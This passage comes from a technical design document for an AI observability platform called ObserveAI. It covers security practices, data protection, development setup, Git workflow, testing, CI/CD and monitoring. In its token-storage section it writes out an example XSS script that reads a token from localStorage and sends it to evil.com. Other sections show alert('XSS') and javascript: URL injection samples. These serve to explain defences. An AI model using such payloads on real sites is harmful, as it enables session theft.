    // Prisma uses parameterized queries
    // Automatically escapes input

XSS prevention:
  ✗ BAD:
    <div dangerouslySetInnerHTML={{ __html: userInput }} />
    // If userInput = "<script>alert('XSS')</script>"
    // → Script executes!
  
  ✓ GOOD:
    <div>{userInput}</div>
    // React automatically escapes
    // Renders as text, not HTML

API KEY VALIDATION:
────────────────────────────────────────────────────────

SDK authentication flow:
  POST /api/sdk-log
  Headers: { 'X-API-Key': 'obs_abc123...' }
      ↓
  Middleware validates:
    1. Extract key from header
    2. Check format (starts with 'obs_')
    3. Look up in database:
       project = await prisma.project.findUnique({
         where: { apiKey: key },
         include: { user: true }
       })
    
    4. Check project exists
    5. Check project.isActive
    6. Check user.isBanned
    7. Check user.subscriptionStatus
    
    8. If all pass → Continue
       If any fail → 401/403 error

Security features:
  • Keys are long (32 chars) and random
  • Can be rotated anytime
  • Each project has unique key
  • Keys never exposed in frontend code
  • Only used server-to-server (SDK → Backend)

WEBHOOK SIGNATURE VERIFICATION:
────────────────────────────────────────────────────────

Verify webhooks are from Stripe:

  import Stripe from 'stripe';
  
  app.post('/webhooks/stripe',
    express.raw({ type: 'application/json' }),  // Important!
    async (req, res) => {
      const sig = req.headers['stripe-signature'];
      const webhookSecret = process.env.STRIPE_WEBHOOK_SECRET;
      
      let event;
      
      try {
        // Verify signature
        event = stripe.webhooks.constructEvent(
          req.body,  // Raw body (not parsed JSON)
          sig,
          webhookSecret
        );
      } catch (err) {
        console.error('Webhook signature verification failed');
        return res.status(400).send('Invalid signature');
      }
      
      // Signature valid, process event
      // ...
    }
  );

Why this matters:
  • Without verification, anyone could send fake webhooks
  • Could fake payment success
  • Could upgrade accounts for free
  • Signature proves webhook is from Stripe

ENVIRONMENT VARIABLES SECURITY:
────────────────────────────────────────────────────────

Never commit secrets to git:

.env file:
  DATABASE_URL=postgresql://...
  JWT_SECRET=super-secret-key-32-chars-min
  STRIPE_SECRET_KEY=sk_test_...
  STRIPE_WEBHOOK_SECRET=whsec_...

.gitignore:
  .env
  .env.local
  .env.production

Production deployment:
  • Set env vars in hosting platform (Vercel, Railway)
  • Never hardcode secrets in code
  • Different secrets for dev/staging/prod

Access control:
  • Only admins can see production env vars
  • CI/CD uses separate service account
  • Rotate secrets periodically

ERROR MESSAGE SANITIZATION:
────────────────────────────────────────────────────────

Don't leak sensitive info in errors:

✗ BAD:
  catch (error) {
    res.status(500).json({
      error: error.message,  // Might contain SQL, file paths, etc.
      stack: error.stack      // Shows internal code structure
    });
  }

✓ GOOD:
  catch (error) {
    console.error('Internal error:', error);  // Log for debugging
    
    res.status(500).json({
      error: 'Internal server error'  // Generic message to client
    });
  }

Production vs Development:
  if (process.env.NODE_ENV === 'production') {
    // Generic error
    res.status(500).json({ error: 'Internal server error' });
  } else {
    // Detailed error (dev only)
    res.status(500).json({
      error: error.message,
      stack: error.stack
    });
  }`

## 13.4 Data Security

`DATA PROTECTION MEASURES
═══════════════════════════════════════════════════════════

DATA ISOLATION:
────────────────────────────────────────────────────────

Multi-tenant architecture:
  • Each user's data is isolated
  • Users can ONLY access their own data
  • Enforced at database query level

Example - Fetching projects:
  ✗ BAD (vulnerable):
    const projects = await prisma.project.findMany();
    // Returns ALL projects from ALL users!
  
  ✓ GOOD (isolated):
    const projects = await prisma.project.findMany({
      where: { userId: req.userId }  // Authenticated user's ID
    });
    // Only returns logged-in user's projects

Every query checks ownership:
  const project = await prisma.project.findUnique({
    where: { id: projectId }
  });
  
  // Verify ownership before returning
  if (project.userId !== req.userId) {
    throw new ForbiddenError('Access denied');
  }

SENSITIVE DATA HANDLING:
────────────────────────────────────────────────────────

What's considered sensitive:
  • Passwords (hashed, never plain)
  • API keys (stored, but only shown once)
  • Stripe customer IDs (internal use only)
  • Payment methods (handled by Stripe, not stored)
  • User prompts/responses (may contain PII)

API responses - exclude sensitive fields:
  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: {
      id: true,
      email: true,
      name: true,
      subscriptionTier: true,
      // passwordHash: false (excluded)
      // stripeCustomerId: false (excluded)
    }
  });

API keys - only show once:
  When creating project:
    • Generate API key
    • Show in success modal: "Copy this now, you won't see it again"
    • After modal closes, never show full key again
    • In settings, show: "obs_abc123..." (first 10 chars only)
    • User can regenerate if lost

DATABASE ENCRYPTION:
────────────────────────────────────────────────────────

Connection encryption:
  DATABASE_URL=postgresql://user:pass@host:5432/db?sslmode=require
  
  • All data in transit is encrypted
  • Man-in-the-middle attacks prevented

At-rest encryption (Supabase):
  • Database files encrypted on disk
  • Automatic backups encrypted
  • Managed by hosting provider

Field-level encryption (if needed):
  For extra sensitive data:
    import crypto from 'crypto';
    
    const algorithm = 'aes-256-gcm';
    const key = process.env.ENCRYPTION_KEY;  // 32 bytes
    
    function encrypt(text) {
      const iv = crypto.randomBytes(16);
      const cipher = crypto.createCipheriv(algorithm, key, iv);
      const encrypted = cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
      const authTag = cipher.getAuthTag();
      return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
    }
    
    function decrypt(encrypted) {
      const parts = encrypted.split(':');
      const iv = Buffer.from(parts[0], 'hex');
      const authTag = Buffer.from(parts[1], 'hex');
      const decipher = crypto.createDecipheriv(algorithm, key, iv);
      decipher.setAuthTag(authTag);
      return decipher.update(parts[2], 'hex', 'utf8') + decipher.final('utf8');
    }

Use case:
  • User payment info (if we stored it - but we don't, Stripe does)
  • Extremely sensitive prompts (optional)

BACKUP STRATEGY:
────────────────────────────────────────────────────────

Automated backups:
  • Daily snapshots (Supabase automatic)
  • Retained for 7 days (FREE) / 30 days (PRO)
  • Encrypted in storage
  • Can restore to any point in time

Manual backups:
  • Weekly export to S3
  • Encrypted before upload
  • Retained for 90 days
  • Downloadable by admin only

Disaster recovery:
  • If database lost, restore from latest backup
  • RTO (Recovery Time Objective): 1 hour
  • RPO (Recovery Point Objective): 24 hours
    (Worst case: lose last 24 hours of data)

GDPR COMPLIANCE:
────────────────────────────────────────────────────────

User data rights:

1. Right to Access:
   • User can download all their data
   • Endpoint: GET /api/user/export
   • Returns JSON with all projects, requests, etc.

2. Right to Delete:
   • User can delete account
   • Endpoint: DELETE /api/user/me
   • Cascades to all related data
   • Permanent deletion after 30 days

3. Right to Rectification:
   • User can update their email, name
   • Endpoint: PUT /api/user/me

4. Data Minimization:
   • Only collect what's necessary
   • Don't store payment card details (Stripe does)
   • Delete old data per retention policy

5. Consent:
   • Terms of Service acceptance on signup
   • Privacy Policy linked
   • Cookie consent (if using analytics)

Privacy Policy must include:
  • What data we collect (email, usage, prompts)
  • Why we collect it (service functionality)
  • How long we store it (7/30/90 days by tier)
  • Who we share with (Stripe for payments)
  • How to delete (account deletion)

AUDIT LOGGING:
────────────────────────────────────────────────────────

Track important actions:

Events to log:
  • User registration
  • User login (with IP, user agent)
  • Subscription changes
  • Project creation/deletion
  • API key regeneration
  • Payment events
  • Admin actions (ban, delete user)

Implementation:
  CREATE TABLE audit_logs (
    id SERIAL PRIMARY KEY,
    userId TEXT,
    action TEXT,
    resource TEXT,
    resourceId TEXT,
    metadata JSONB,
    ipAddress TEXT,
    userAgent TEXT,
    timestamp TIMESTAMP DEFAULT NOW()
  );

Usage:
  await prisma.auditLog.create({
    data: {
      userId: req.userId,
      action: 'PROJECT_DELETED',
      resource: 'project',
      resourceId: projectId,
      metadata: { projectName: project.name },
      ipAddress: req.ip,
      userAgent: req.headers['user-agent']
    }
  });

Benefits:
  • Track security incidents
  • Debug user issues
  • Compliance audits
  • Detect suspicious activity`

## 13.5 Frontend Security

`CLIENT-SIDE SECURITY
═══════════════════════════════════════════════════════════

XSS PROTECTION:
────────────────────────────────────────────────────────

React's automatic escaping:
  const userName = "<script>alert('XSS')</script>";
  
  return <div>{userName}</div>;
  // Renders: &lt;script&gt;alert('XSS')&lt;/script&gt;
  // NOT executed as script ✓

When to be careful:
  ✗ dangerouslySetInnerHTML:
    <div dangerouslySetInnerHTML={{ __html: userContent }} />
    // ONLY use if content is sanitized
  
  ✓ Use DOMPurify if HTML needed:
    import DOMPurify from 'dompurify';
    
    const clean = DOMPurify.sanitize(userHTML);
    <div dangerouslySetInnerHTML={{ __html: clean }} />

Content Security Policy (CSP):
  Set headers to restrict resource loading:
    Content-Security-Policy: 
      default-src 'self';
      script-src 'self' 'unsafe-inline';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      connect-src 'self' https://api.observeai.com;

  Prevents:
    • Loading scripts from unknown domains
    • Inline script execution (XSS)
    • Data exfiltration

SENSITIVE DATA IN FRONTEND:
────────────────────────────────────────────────────────

What to NEVER put in frontend:
  ✗ API secrets (Stripe secret key)
  ✗ Database credentials
  ✗ JWT secret
  ✗ Internal API endpoints

What's OK in frontend:
  ✓ Stripe publishable key (pk_...)
  ✓ Public API URL
  ✓ Feature flags
  ✓ User's own data (already has access)

Environment variables:
  // .env
  VITE_API_URL=https://api.observeai.com
  VITE_STRIPE_PK=pk_test_...
  
  // Only vars prefixed with VITE_ are exposed
  // Others stay server-side

Usage:
  const apiUrl = import.meta.env.VITE_API_URL;
  // Safe - meant to be public

TOKEN STORAGE:
────────────────────────────────────────────────────────

localStorage security:
  Vulnerable to XSS:
    <script>
      // If XSS exists, attacker can:
      const token = localStorage.getItem('token');
      // Send to attacker's server
      fetch('https://evil.com/steal?token=' + token);
    </script>

Mitigation:
  • Prevent XSS (primary defense)
  • Short token expiry (7 days)
  • Rotate tokens on sensitive actions
  • HttpOnly cookies (more secure, but complex)

Trade-off:
  • localStorage: Simple, but XSS vulnerable
  • HttpOnly cookie: XSS safe, but CSRF vulnerable
  • We choose localStorage + strong XSS prevention

DEPENDENCY SECURITY:
────────────────────────────────────────────────────────

Check for vulnerabilities:
  npm audit
  
  Output:
    found 3 vulnerabilities (2 moderate, 1 high)
    run `npm audit fix` to fix them

Automated scanning:
  • Dependabot (GitHub) - auto PRs to update deps
  • Snyk - continuous monitoring
  • npm audit in CI/CD pipeline

Update regularly:
  • Patch updates (1.2.3 → 1.2.4): Weekly
  • Minor updates (1.2.0 → 1.3.0): Monthly
  • Major updates (1.0.0 → 2.0.0): Review carefully

SECURE CODING PRACTICES:
────────────────────────────────────────────────────────

1. Never trust client-side validation:
   ✗ BAD:
     // Only validate on frontend
     if (password.length >= 8) {
       submitForm();
     }
     // User can bypass with dev tools!
   
   ✓ GOOD:
     // Validate on both frontend AND backend
     Frontend: User experience
     Backend: Security (can't bypass)

2. Don't expose sensitive info in console:
   ✗ BAD:
     console.log('User token:', token);
     console.log('API response:', response);
   
   ✓ GOOD:
     // Remove console.logs in production
     if (process.env.NODE_ENV === 'development') {
       console.log('Debug info:', ...);
     }

3. Sanitize URLs:
   ✗ BAD:
     const url = userInput;
     window.location = url;
     // User can inject: javascript:alert('XSS')
   
   ✓ GOOD:
     const url = new URL(userInput);
     if (url.protocol === 'https:') {
       window.location = url;
     }`

---

# 14. Development Workflow

## 14.1 Development Environment Setup

`LOCAL DEVELOPMENT SETUP
═══════════════════════════════════════════════════════════

PREREQUISITES:
────────────────────────────────────────────────────────

Required installations:
  ✓ Node.js v18+ (LTS recommended)
  ✓ npm or yarn or pnpm
  ✓ Git
  ✓ PostgreSQL (or use Supabase cloud)
  ✓ VS Code (recommended) or any editor

VS Code extensions:
  • ESLint
  • Prettier
  • Prisma
  • Tailwind CSS IntelliSense
  • TypeScript and JavaScript Language Features

PROJECT STRUCTURE SETUP:
────────────────────────────────────────────────────────

Create workspace:
  mkdir ai-observability-platform
  cd ai-observability-platform

Initialize Git:
  git init
  git remote add origin <your-repo-url>

Create monorepo structure:
  ai-observability-platform/
  ├── backend/          # Express API
  ├── frontend/         # User platform (React)
  ├── admin/            # Admin panel (React)
  ├── sdk/              # npm package
  ├── docs/             # Documentation
  └── .github/          # CI/CD workflows

OR use monorepo tools:
  • Turborepo
  • Nx
  • Lerna

BACKEND SETUP:
────────────────────────────────────────────────────────

1. Initialize:
   cd backend
   npm init -y
   npm install express prisma @prisma/client typescript ts-node
   npm install -D nodemon @types/node @types/express

2. Setup TypeScript:
   npx tsc --init
   
   tsconfig.json:
   {
     "compilerOptions": {
       "target": "ES2020",
       "module": "commonjs",
       "outDir": "./dist",
       "rootDir": "./src",
       "strict": true,
       "esModuleInterop": true
     }
   }

3. Setup Prisma:
   npx prisma init
   
   Creates:
   • prisma/schema.prisma
   • .env (with DATABASE_URL)

4. Environment variables:
   .env:
   DATABASE_URL="postgresql://user:password@localhost:5432/observeai"
   JWT_SECRET="your-super-secret-key-change-this"
   STRIPE_SECRET_KEY="sk_test_..."
   STRIPE_WEBHOOK_SECRET="whsec_..."
   PORT=3000

5. Create folder structure:
   src/
   ├── index.ts
   ├── routes/
   ├── controllers/
   ├── services/
   ├── middleware/
   ├── utils/
   └── types/

6. package.json scripts:
   {
     "scripts": {
       "dev": "nodemon src/index.ts",
       "build": "tsc",
       "start": "node dist/index.js",
       "prisma:generate": "prisma generate",
       "prisma:migrate": "prisma migrate dev",
       "prisma:studio": "prisma studio"
     }
   }

FRONTEND SETUP:
────────────────────────────────────────────────────────

1. Create React app:
   cd frontend
   npm create vite@latest . -- --template react-ts
   npm install

2. Install dependencies:
   npm install react-router-dom
   npm install zustand
   npm install @tanstack/react-query
   npm install axios
   npm install zod react-hook-form @hookform/resolvers
   npm install recharts
   npm install @stripe/stripe-js @stripe/react-stripe-js

3. Install Tailwind + shadcn/ui:
   npm install -D tailwindcss postcss autoprefixer
   npx tailwindcss init -p
   
   npx shadcn-ui@latest init

4. Environment variables:
   .env:
   VITE_API_URL=http://localhost:3000
   VITE_STRIPE_PK=pk_test_...

5. Folder structure:
   src/
   ├── pages/
   │   ├── public/
   │   └── private/
   ├── components/
   │   ├── ui/
   │   ├── layout/
   │   └── ...
   ├── store/
   ├── hooks/
   ├── lib/
   └── types/

ADMIN PANEL SETUP:
────────────────────────────────────────────────────────

Same as frontend, but in admin/ folder

Can share components:
  • Option 1: Copy from frontend/
  • Option 2: Create shared/ folder with common components
  • Option 3: Publish internal npm package

SDK SETUP:
────────────────────────────────────────────────────────

1. Initialize:
   cd sdk
   npm init -y
   npm install -D typescript @types/node

2. TypeScript config:
   tsconfig.json:
   {
     "compilerOptions": {
       "target": "ES2020",
       "module": "commonjs",
       "declaration": true,
       "outDir": "./dist",
       "rootDir": "./src"
     }
   }

3. package.json:
   {
     "name": "observeai-sdk",
     "version": "1.0.0",
     "main": "dist/index.js",
     "types": "dist/index.d.ts",
     "files": ["dist"],
     "scripts": {
       "build": "tsc",
       "prepublishOnly": "npm run build"
     }
   }

4. Folder structure:
   src/
   ├── index.ts
   ├── core/
   ├── providers/
   │   ├── openai.ts
   │   └── anthropic.ts
   └── types/`

## 14.2 Git Workflow

`VERSION CONTROL STRATEGY
═══════════════════════════════════════════════════════════

BRANCHING MODEL:
────────────────────────────────────────────────────────

Main branches:
  main (production)
    ↑
    └── develop (staging)
         ↑
         ├── feature/dashboard
         ├── feature/auth
         ├── feature/payments
         ├── bugfix/login-error
         └── hotfix/security-patch

Branch naming:
  • feature/feature-name
  • bugfix/bug-description
  • hotfix/critical-fix
  • chore/update-dependencies

DEVELOPMENT FLOW:
────────────────────────────────────────────────────────

1. Start new feature:
   git checkout develop
   git pull origin develop
   git checkout -b feature/cost-optimization

2. Make changes:
   • Write code
   • Commit frequently with meaningful messages

3. Commit message format:
   type(scope): description
   
   Examples:
   feat(dashboard): add cost optimization widget
   fix(auth): resolve token expiry issue
   chore(deps): update react to 18.2.0
   docs(readme): update installation instructions

4. Push to remote:
   git push origin feature/cost-optimization

5. Create Pull Request:
   • GitHub/GitLab PR
   • Describe changes
   • Reference issue number (if any)
   • Request review

6. Code review:
   • Team member reviews
   • Suggests changes
   • Approves when ready

7. Merge to develop:
   • Squash commits (clean history)
   • Delete feature branch

8. Deploy to staging:
   • Automatic deployment from develop
   • Test in staging environment

9. Merge to main:
   • Create release PR: develop → main
   • Final testing
   • Merge and tag release

10. Deploy to production:
    • Automatic deployment from main
    • Monitor for errors

COMMIT BEST PRACTICES:
────────────────────────────────────────────────────────

Good commits:
  ✓ feat(auth): implement JWT authentication
  ✓ fix(sdk): handle network timeouts gracefully
  ✓ refactor(db): optimize request query indexes
  ✓ docs(api): add endpoint documentation

Bad commits:
  ✗ "updates"
  ✗ "fix stuff"
  ✗ "wip"
  ✗ "asdfasdf"

Commit size:
  • Small, focused commits
  • One logical change per commit
  • Makes code review easier
  • Easier to revert if needed

.gitignore:
────────────────────────────────────────────────────────

# Dependencies
node_modules/
npm-debug.log
yarn-error.log

# Environment variables
.env
.env.local
.env.production

# Build outputs
dist/
build/
.next/

# IDE
.vscode/
.idea/
*.swp

# OS
.DS_Store
Thumbs.db

# Database
*.db
*.sqlite

# Logs
logs/
*.log`

## 14.3 Testing Strategy

`TESTING APPROACH
═══════════════════════════════════════════════════════════

TESTING PYRAMID:
────────────────────────────────────────────────────────

         /\
        /  \       E2E Tests (Few)
       /────\
      /      \     Integration Tests (Some)
     /────────\
    /          \   Unit Tests (Many)
   /────────────\

Unit Tests (70%):
  • Test individual functions
  • Fast to run
  • Easy to write
  • High coverage

Integration Tests (20%):
  • Test component interactions
  • Database queries
  • API endpoints
  • More realistic

E2E Tests (10%):
  • Test complete user flows
  • Browser automation
  • Slow but comprehensive

BACKEND TESTING:
────────────────────────────────────────────────────────

Framework: Jest

Setup:
  npm install -D jest @types/jest ts-jest supertest @types/supertest
  
  jest.config.js:
  module.exports = {
    preset: 'ts-jest',
    testEnvironment: 'node',
    testMatch: ['**/*.test.ts']
  };

Unit test example:
  // services/cost-calculator.test.ts
  import { calculateCost } from './cost-calculator';
  
  describe('Cost Calculator', () => {
    test('calculates GPT-4 cost correctly', () => {
      const cost = calculateCost('gpt-4', 1000, 500);
      expect(cost).toBe(0.06); // $0.03 + $0.03
    });
    
    test('returns 0 for unknown model', () => {
      const cost = calculateCost('unknown', 100, 50);
      expect(cost).toBe(0);
    });
  });

Integration test example:
  // routes/auth.test.ts
  import request from 'supertest';
  import app from '../app';
  
  describe('Auth Routes', () => {
    test('POST /api/auth/register creates user', async () => {
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'test@example.com',
          password: 'password123'
        });
      
      expect(response.status).toBe(201);
      expect(response.body.data.user.email).toBe('test@example.com');
      expect(response.body.data.token).toBeDefined();
    });
    
    test('POST /api/auth/login with wrong password fails', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'test@example.com',
          password: 'wrongpassword'
        });
      
      expect(response.status).toBe(401);
    });
  });

Database testing:
  • Use separate test database
  • Reset database before each test
  • Use transactions (rollback after test)
  
  beforeEach(async () => {
    await prisma.user.deleteMany();
    await prisma.project.deleteMany();
  });

FRONTEND TESTING:
────────────────────────────────────────────────────────

Framework: Vitest + React Testing Library

Setup:
  npm install -D vitest @testing-library/react @testing-library/jest-dom

Component test example:
  // components/StatsCard.test.tsx
  import { render, screen } from '@testing-library/react';
  import { StatsCard } from './StatsCard';
  
  describe('StatsCard', () => {
    test('renders stat value', () => {
      render(<StatsCard title="Requests" value="1,234" />);
      
      expect(screen.getByText('Requests')).toBeInTheDocument();
      expect(screen.getByText('1,234')).toBeInTheDocument();
    });
    
    test('shows loading state', () => {
      render(<StatsCard title="Requests" isLoading />);
      
      expect(screen.getByRole('status')).toBeInTheDocument();
    });
  });

Hook test example:
  // hooks/useAuth.test.ts
  import { renderHook, act } from '@testing-library/react';
  import { useAuthStore } from '../store/authStore';
  
  describe('useAuthStore', () => {
    test('logs in user', () => {
      const { result } = renderHook(() => useAuthStore());
      
      act(() => {
        result.current.setAuth(
          { id: '1', email: 'test@example.com' },
          'token123'
        );
      });
      
      expect(result.current.isAuthenticated).toBe(true);
      expect(result.current.user?.email).toBe('test@example.com');
    });
    
    test('logs out user', () => {
      const { result } = renderHook(() => useAuthStore());
      
      act(() => {
        result.current.logout();
      });
      
      expect(result.current.isAuthenticated).toBe(false);
      expect(result.current.user).toBeNull();
    });
  });

E2E TESTING:
────────────────────────────────────────────────────────

Framework: Playwright

Setup:
  npm install -D @playwright/test

Test example:
  // e2e/auth.spec.ts
  import { test, expect } from '@playwright/test';
  
  test('user can register and login', async ({ page }) => {
    // Go to homepage
    await page.goto('http://localhost:5173');
    
    // Click register
    await page.click('text=Sign Up');
    
    // Fill form
    await page.fill('[name="email"]', 'e2e@example.com');
    await page.fill('[name="password"]', 'password123');
    await page.click('button[type="submit"]');
    
    // Should redirect to dashboard
    await expect(page).toHaveURL(/.*dashboard/);
    
    // Should see welcome message
    await expect(page.locator('text=Welcome')).toBeVisible();
  });

Run E2E tests:
  npx playwright test
  npx playwright test --headed  # See browser
  npx playwright test --debug   # Debug mode

TEST COVERAGE:
────────────────────────────────────────────────────────

Run with coverage:
  npm test -- --coverage

Target coverage:
  • Statements: 80%+
  • Branches: 75%+
  • Functions: 80%+
  • Lines: 80%+

Focus coverage on:
  ✓ Business logic (cost calculation, usage limiting)
  ✓ Authentication/authorization
  ✓ Payment processing
  ✓ Critical user flows

Don't obsess over:
  • UI components (manual testing often better)
  • Simple getters/setters
  • Config files`

## 14.4 CI/CD Pipeline

`CONTINUOUS INTEGRATION & DEPLOYMENT
═══════════════════════════════════════════════════════════

GITHUB ACTIONS WORKFLOW:
────────────────────────────────────────────────────────

.github/workflows/ci.yml:

name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  # Backend tests
  backend-test:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        working-directory: ./backend
        run: npm ci
      
      - name: Run linter
        working-directory: ./backend
        run: npm run lint
      
      - name: Run tests
        working-directory: ./backend
        run: npm test
        env:
          DATABASE_URL: ${{ secrets.TEST_DATABASE_URL }}
          JWT_SECRET: test-secret
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
  
  # Frontend tests
  frontend-test:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        working-directory: ./frontend
        run: npm ci
      
      - name: Run linter
        working-directory: ./frontend
        run: npm run lint
      
      - name: Run tests
        working-directory: ./frontend
        run: npm test
      
      - name: Build
        working-directory: ./frontend
        run: npm run build
  
  # E2E tests
  e2e-test:
    runs-on: ubuntu-latest
    needs: [backend-test, frontend-test]
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install Playwright
        run: npx playwright install --with-deps
      
      - name: Start services
        run: docker-compose up -d
      
      - name: Run E2E tests
        run: npm run test:e2e
      
      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: playwright-report
          path: playwright-report/
  
  # Deploy to staging (develop branch)
  deploy-staging:
    runs-on: ubuntu-latest
    needs: [backend-test, frontend-test, e2e-test]
    if: github.ref == 'refs/heads/develop'
    
    steps:
      - name: Deploy backend to Railway (staging)
        run: |
          # Railway CLI deployment
          railway up --service backend --environment staging
      
      - name: Deploy frontend to Vercel (staging)
        run: |
          # Vercel CLI deployment
          vercel --prod --scope staging
  
  # Deploy to production (main branch)
  deploy-production:
    runs-on: ubuntu-latest
    needs: [backend-test, frontend-test, e2e-test]
    if: github.ref == 'refs/heads/main'
    
    steps:
      - name: Deploy backend to Railway (production)
        run: |
          railway up --service backend --environment production
      
      - name: Deploy frontend to Vercel (production)
        run: |
          vercel --prod
      
      - name: Run smoke tests
        run: npm run test:smoke
      
      - name: Notify team
        if: success()
        uses: 8398a7/action-slack@v3
        with:
          status: custom
          custom_payload: |
            {
              text: "✅ Production deployment successful!"
            }

DEPLOYMENT PROCESS:
────────────────────────────────────────────────────────

Development → Staging → Production

1. Developer pushes to feature branch
   → CI runs tests
   → If pass, can merge to develop

2. Merge to develop
   → CI runs tests
   → Auto-deploy to staging
   → Staging URL: https://staging.observeai.com

3. Test on staging
   → Manual QA
   → Verify features work
   → Check no regressions

4. Create release PR: develop → main
   → Final review
   → Merge to main

5. Deploy to production
   → CI runs tests
   → Auto-deploy to production
   → Production URL: https://observeai.com

6. Monitor
   → Check error rates
   → Verify deployments successful
   → Watch user activity

ROLLBACK STRATEGY:
────────────────────────────────────────────────────────

If production deployment has issues:

Option 1: Revert commit
  git revert <commit-hash>
  git push origin main
  → Triggers new deployment with reverted code

Option 2: Deploy previous version
  git reset --hard <previous-commit>
  git push --force origin main
  → Deploys last known good version

Option 3: Feature flag
  if (!featureFlags.newFeatureEnabled) {
    // Use old code
  } else {
    // Use new code
  }
  → Disable feature without redeployment

DATABASE MIGRATIONS:
────────────────────────────────────────────────────────

Careful with production migrations!

Safe migrations:
  ✓ Adding new tables
  ✓ Adding new columns (with defaults)
  ✓ Adding indexes
  ✓ Creating views

Risky migrations:
  ⚠ Removing columns (lose data)
  ⚠ Renaming columns (breaks queries)
  ⚠ Changing column types (data loss)
  ⚠ Adding NOT NULL constraints

Migration process:
  1. Write migration locally
  2. Test on dev database
  3. Deploy to staging
  4. Test on staging
  5. Create production backup
  6. Apply to production
  7. Monitor for errors
  8. If issues, rollback:
     prisma migrate resolve --rolled-back <migration-name>

ZERO-DOWNTIME DEPLOYMENTS:
────────────────────────────────────────────────────────

Backend (Railway):
  • Rolling deployment
  • New instance starts
  • Health check passes
  • Traffic switches to new instance
  • Old instance shuts down
  • ~30 seconds of overlap (no downtime)

Frontend (Vercel):
  • Instant deployment
  • New version uploaded to CDN
  • DNS switches to new version
  • Old version cached for rollback
  • Zero downtime

Database:
  • Always online
  • Migrations run while live
  • Use careful migration strategy`

## 14.5 Monitoring & Debugging

`PRODUCTION MONITORING
═══════════════════════════════════════════════════════════

ERROR TRACKING:
────────────────────────────────────────────────────────

Tool: Sentry (free tier available)

Setup:
  npm install @sentry/node @sentry/react

Backend:
  import * as Sentry from '@sentry/node';
  
  Sentry.init({
    dsn: process.env.SENTRY_DSN,
    environment: process.env.NODE_ENV,
    tracesSampleRate: 1.0
  });
  
  // Catches all unhandled errors
  app.use(Sentry.Handlers.errorHandler());

Frontend:
  import * as Sentry from '@sentry/react';
  
  Sentry.init({
    dsn: process.env.VITE_SENTRY_DSN,
    environment: process.env.NODE_ENV,
    tracesSampleRate: 0.1  // Sample 10% of traces
  });

Benefits:
  • Get notified of errors immediately
  • See stack traces
  • User context (what they were doing)
  • Frequency of errors
  • Affected users count

UPTIME MONITORING:
────────────────────────────────────────────────────────

Tool: UptimeRobot (free tier)

Setup:
  1. Add monitors:
     • https://observeai.com (check every 5 min)
     • https://api.observeai.com/health (check every 5 min)
     • https://admin.observeai.com (check every 5 min)
  
  2. Configure alerts:
     • Email if down
     • Slack notification
     • SMS for critical (optional)
  
  3. Status page:
     • Public status page: status.observeai.com
     • Shows uptime percentage
     • Current status of all services

PERFORMANCE MONITORING:
────────────────────────────────────────────────────────

Tool: Vercel Analytics (for frontend)

Metrics tracked:
  • Page load time
  • Time to First Byte (TTFB)
  • First Contentful Paint (FCP)
  • Largest Contentful Paint (LCP)
  • Cumulative Layout Shift (CLS)
  • First Input Delay (FID)

Backend performance:
  • Response time per endpoint
  • Database query time
  • External API calls
  
  // Log slow requests
  app.use((req, res, next) => {
    const start = Date.now();
    
    res.on('finish', () => {
      const duration = Date.now() - start;
      
      if (duration > 1000) {
        console.warn('Slow request:', {
          method: req.method,
          url: req.url,
          duration: `${duration}ms`
        });
      }
    });
    
    next();
  });

LOGGING:
────────────────────────────────────────────────────────

Structured logging with Winston:

  import winston from 'winston';
  
  const logger = winston.createLogger({
    level: 'info',
    format: winston.format.json(),
    transports: [
      new winston.transports.Console(),
      new winston.transports.File({ filename: 'error.log', level: 'error' }),
      new winston.transports.File({ filename: 'combined.log' })
    ]
  });
  
  logger.info('User registered', {
    userId: user.id,
    email: user.email
  });
  
  logger.error('Payment failed', {
    userId: user.id,
    error: error.message,
    stripeError: stripeError
  });

Log levels:
  • error: Critical issues
  • warn: Problems that don't stop execution
  • info: General information
  • debug: Detailed debugging info (dev only)

HEALTH CHECK ENDPOINT:
────────────────────────────────────────────────────────

GET /health

Purpose:
  • Uptime monitoring can ping this
  • Load balancer health checks
  • Verify service is responsive

Implementation:
  app.get('/health', async (req, res) => {
    try {
      // Check database
      await prisma.$queryRaw`SELECT 1`;
      
      // Check Stripe (optional)
      // await stripe.balance.retrieve();
      
      res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        database: 'connected'
      });
    } catch (error) {
      res.status(503).json({
        status: 'unhealthy',
        error: error.message
      });
    }
  });

DEBUGGING PRODUCTION ISSUES:
────────────────────────────────────────────────────────

1. Check error tracking (Sentry):
   • What error occurred?
   • How many users affected?
   • When did it start?

2. Check logs:
   • Railway logs: `railway logs`
   • Vercel logs: Deployment dashboard
   • Look for patterns

3. Check monitoring:
   • Uptime: Is service down?
   • Performance: Response times high?
   • Database: Connection issues?

4. Reproduce locally:
   • Try to trigger same error
   • Use production data (anonymized)
   • Check different environments

5. Investigate database:
   • Open Prisma Studio
   • Query affected records
   • Check data integrity

6. Rollback if critical:
   • Deploy previous version
   • Fix in development
   • Re-deploy when ready

7. Post-mortem:
   • What happened?
   • Why did it happen?
   • How to prevent it?
   • Document learnings`

## 14.6 Documentation

`DOCUMENTATION STRATEGY
═══════════════════════════════════════════════════════════

README.md:
────────────────────────────────────────────────────────

# ObserveAI

AI observability platform for tracking requests, costs, and performance.

## Features
- Request logging
- Cost tracking
- Error monitoring
- Optimization suggestions

## Quick Start

### Prerequisites
- Node.js 18+
- PostgreSQL 15+
- Stripe account

### Installation

